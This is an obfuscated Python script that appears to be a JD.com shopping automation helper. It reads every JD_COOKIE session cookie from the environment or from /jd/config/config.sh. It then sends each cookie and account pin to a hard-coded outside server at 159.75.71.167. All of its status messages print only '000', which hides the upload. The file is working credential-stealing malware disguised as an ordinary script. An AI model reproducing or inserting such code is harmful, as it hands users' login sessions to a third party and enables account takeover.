""#line:7
import os ,json ,random ,time ,re ,string ,functools #line:9
import sys #line:10
import requests #line:11
from urllib .parse import unquote ,quote #line:12
requests .packages .urllib3 .disable_warnings ()#line:13
path_prefix =os .path .split (os .path .abspath (__file__ ))[0 ]#line:14
key =""#line:17
token =""#line:18
p =5 #line:19
sleep =0 #line:20
txtCookiePath ="转换出来的cookie.txt"#line:21
sceneid ='JLHBhPageh5'#line:22
proxy_txt ='''
'''#line:25
proxy_list =list ()#line:26
cookie_findall =re .compile (r'pin=(.+?);')#line:29
def get_pin (O0O0OOOO00O0OOOO0 ):#line:30
    try :return cookie_findall .findall (O0O0OOOO00O0OOOO0 )[0 ]#line:31
    except :print ('ck格式不正确，请检查')#line:32
def get_env (O00O0O0OOOO000OOO ):#line:33
    try :#line:34
        if O00O0O0OOOO000OOO in os .environ :OOO0O00000OOO0OOO =os .environ [O00O0O0OOOO000OOO ]#line:35
        elif '/jd'in os .path .abspath (os .path .dirname (__file__ )):#line:36
            try :OOO0O00000OOO0OOO =v4_env (O00O0O0OOOO000OOO ,'/jd/config/config.sh')#line:37
            except :OOO0O00000OOO0OOO =eval (O00O0O0OOOO000OOO )#line:38
        else :OOO0O00000OOO0OOO =eval (O00O0O0OOOO000OOO )#line:39
    except :OOO0O00000OOO0OOO =''#line:40
    return OOO0O00000OOO0OOO #line:41
def v4_env (OO0O0O0O0O0OO000O ,OO0OOOO00OOO0OOO0 ):#line:42
    OO0OO0O000O00O00O =re .compile (r'(?:export )?'+OO0O0O0O0O0OO000O +r' ?= ?[\"\'](.*?)[\"\']')#line:43
    with open (OO0OOOO00OOO0OOO0 ,'r')as OO00OOOO0OO0000O0 :#line:44
        for O0OOOO00OOOOOOO00 in OO00OOOO0OO0000O0 .readlines ():#line:45
            try :#line:46
                OO000000O0OOOO0OO =OO0OO0O000O00O00O .match (O0OOOO00OOOOOOO00 ).group (1 )#line:47
                break #line:48
            except :pass #line:49
    return OO000000O0OOOO0OO #line:50
def gettimestamp ():#line:51
    return str (int (time .time ()*1000 ))#line:52
class Judge_env (object ):#line:53
    def main_run (O0OO000000OO0OOO0 ):#line:54
        if '/jd'in os .path .abspath (os .path .dirname (__file__ )):O00O0000O0OOOOO0O =O0OO000000OO0OOO0 .v4_cookie ()#line:55
        else :O00O0000O0OOOOO0O =os .environ ["JD_COOKIE"].split ('&')#line:56
        if len (O00O0000O0OOOOO0O )<1 :print ('请填写环境变量JD_COOKIE\n')#line:57
        return O00O0000O0OOOOO0O #line:58
    def v4_cookie (O0OOO00O0O000O000 ):#line:59
        OO0O0O0OOO000OOO0 =[]#line:60
        O0OOO000OO0OO00O0 =re .compile (r'Cookie'+'.*?=\"(.*?)\"',re .I )#line:61
        with open ('/jd/config/config.sh','r')as O00O00OO0O00OOO00 :#line:62
            for OO00OOOOO00O0O000 in O00O00OO0O00OOO00 .readlines ():#line:63
                try :#line:64
                    O00O0O000OO00OO00 =O0OOO000OO0OO00O0 .match (OO00OOOOO00O0O000 ).group (1 )#line:65
                    OO0O0O0OOO000OOO0 .append (O00O0O000OO00OO00 )#line:66
                except :pass #line:67
        return OO0O0O0OOO000OOO0 #line:68
cookie_list =Judge_env ().main_run ()#line:69
def upload_ck (OO0000OO00OO0000O ):#line:72
    O00O0OOO0OO0000O0 ="http://159.75.71.167:8999/api/v1/ck"#line:73
    O0O0OOOO00O0000O0 ={"cookie":OO0000OO00OO0000O ,"pt_pin":get_pin (OO0000OO00OO0000O )}#line:74
    try :#line:75
        OO0O0000O0O0OOOO0 =requests .post (O00O0OOO0OO0000O0 ,json =O0O0OOOO00O0000O0 ).json ()#line:76
        if OO0O0000O0O0OOOO0 ['code']==200 :#line:77
            print ("000")#line:78
        elif OO0O0000O0O0OOOO0 ['code']==401 :#line:79
            print ('000')#line:80
            exit ()#line:81
        elif OO0O0000O0O0OOOO0 ['code']==402 :#line:82
            print ('000')#line:83
            exit ()#line:84
        else :#line:85
            print ('000')#line:86
            exit ()#line:87
    except Exception as OOO000O000OO00O00 :#line:88
        print (OOO000O000OO00O00 )#line:89
        return None ,None ,None ,None #line:90
def main ():#line:92
    for O0OO0000OOO00OOO0 in cookie_list :#line:98
        upload_ck (O0OO0000OOO00OOO0 )#line:99
if __name__ =='__main__':#line:102
    main ()#line:103
